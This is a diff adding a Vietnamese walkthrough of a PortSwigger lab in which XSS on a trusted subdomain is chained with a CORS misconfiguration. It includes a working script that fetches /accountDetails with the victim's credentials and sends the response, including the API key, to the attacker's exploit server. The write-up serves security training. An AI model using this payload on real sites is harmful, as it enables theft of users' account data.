@@ -47,8 +47,22 @@ Do thẻ iframe có thuộc tính `src="data:text/html,....`, Origin sẽ tự �
 Tiến hành URL decode, ta thu được `apikey=n2daOK1lnvFCmG9DwadLa7iTt1vZieUi`. Submit thông tin có được, kết quả thành công.
 
 # 3. CORS vulnerability with trusted insecure protocols
+Nhận thấy website có chức năng check stock. Sau khi click nút "Check stock" với một sản phẩm bất kỳ, ta sẽ được chuyển đến URL `http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/?productId=2&storeId=1`. Thử thay đổi `productId=<script>alert(1)</script>` thì thấy câu lệnh alert được thực thi. Như vậy website có lỗ hổng XSS.
+
+Vào BurpRepeater, thay đổi `Origin: http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net` thì trong response trả về có header `Access-Control-Allow-Origin`. Như vậy ta có thể kết hợp XSS để khai thác lỗ hổng CORS, gửi request tới `/accountDetails` và lấy thông tin về.
+
+Vào exploit server và cấu hình đoạn HTML sau:
+```
 <script>
-document.location="https://stock.0af4007804f8391dc0d57751008800c4.web-security-academy.net/?productId=%3Cscript%3Elet%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%20%3D%20printResponse%3Bxhr.open%28%27GET%27%2C%20%27https%3A%2F%2F0af4007804f8391dc0d57751008800c4.web-security-academy.net%2FaccountDetails%27%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3Bfunction%20printResponse%28%29%7B%20%20%20%20console.log%28encodeURIComponent%28this.responseText%29%29%3B%7D%3C%2Fscript%3E&storeId=1"
+document.location="http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/?productId=<script>let xhr=new XMLHttpRequest();xhr.onreadystatechange=printResponse;xhr.open('GET','https://0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/accountDetails');xhr.withCredentials=true;xhr.send();function printResponse(){document.location='https://exploit-0a3d00cd035dc84bc05021db016c00db.exploit-server.net/?key='%2Bthis.responseText;}%3C/script>&storeId=1"
 </script>
+```
+
+Đoạn script đầu tiên sẽ chuyển hướng người dùng tới `stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net` với payload XSS. Đoạn XSS này sau đó tiếp tục gửi request `/accountDetails`, lấy thông tin về và chuyển hướng tới exploit server, trong URL sẽ chứa những data thu thập được.
+
+Sau khi click "Deliver to victim", vào Access log kiểm tra ta thấy có requests chứa dữ liệu Json được gửi đến
+![image](https://user-images.githubusercontent.com/103978452/211489774-a4881ba2-d188-4fa7-9c9d-46949cd6cded.png)
+
+Sau khi URL decode, ta thu được `apiKey=IZaEsQwzA4YTgbgUoaW56AWiLa84Zo9K`. Sử dụng dữ liệu thu được để submit, kết quả thành công.
 
 # 4. CORS vulnerability with internal network pivot attackCORS vulnerability with internal network pivot attack
